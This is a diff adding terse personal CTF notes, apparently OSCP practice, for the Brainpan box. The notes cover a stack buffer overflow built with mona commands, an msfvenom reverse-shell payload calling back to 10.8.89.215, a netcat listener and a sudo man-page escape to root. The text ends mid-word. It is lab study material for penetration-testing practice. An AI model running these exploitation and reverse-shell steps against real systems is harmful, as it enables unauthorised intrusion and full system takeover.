@@ -157,3 +157,63 @@ Log data, item 3
 \xbf\x16\x04\x08
 
 User Shell
+Then enum (ff is key) Then SMB to root.txt.txt
+
+### Brainpan
+Port 9999
+Fuzzing 
+Died att 700 bytes
+
+!mona findmsp -distance 1000
+
+Log data, item 25
+ Address=0BADF00D
+ Message=    EIP contains normal pattern : 0x35724134 (offset 524)
+
+!mona bytearray -b "\x00"
+
+payload with all bad
+
+!mona compare -f C:\mona\oscp\bytearray.bin -a 
+
+!mona jmp -r esp -cpb "\x00"
+
+Log data, item 3
+ Address=311712F3
+ Message=  0x311712f3 : jmp esp |  {PAGE_EXECUTE_READ} [brainpan.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\win7.INVID\Desktop\vulnerable-apps\brainpan\brainpan.exe)
+
+rlwrap nc -nvlp 53
+
+msfvenom -p inux/x86/shell_reverse_tcp LHOST=10.8.89.215 LPORT=53 EXITFUNC=thread -b "\x00" -f py
+
+python -c 'import pty;pty.spawn("/bin/bash")'
+
+ctrl z   
+background
+stty raw -echo   
+fg
+
+Linux brainpan 3.5.0-25-generic #39-Ubuntu SMP Mon Feb 25 19:02:34 UTC 2013 i686 i686 i686 GNU/Linux
+
+"Ubuntu 12.10"
+
+reynard:x:1000:1000:Reynard,,,:/home/reynard:/bin/bash                                                                                                                                                                                      
+anansi:x:1001:1001:Anansi,,,:/home/anansi:/bin/bash                                                                                                                                                                                         
+puck:x:1002:1002:Puck,,,:/home/puck:/bin/bash 
+
+sudo -l
+sudo -l
+Matching Defaults entries for puck on this host:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User puck may run the following commands on this host:
+    (root) NOPASSWD: /home/anansi/bin/anansi_util
+
+sudo /home/anansi/bin/anansi_util manual man
+
+!/bin/sh
+
+id                                                                                                                                                                                                                                          
+uid=0(root) gid=0(root) groups=0(root) 
+lo
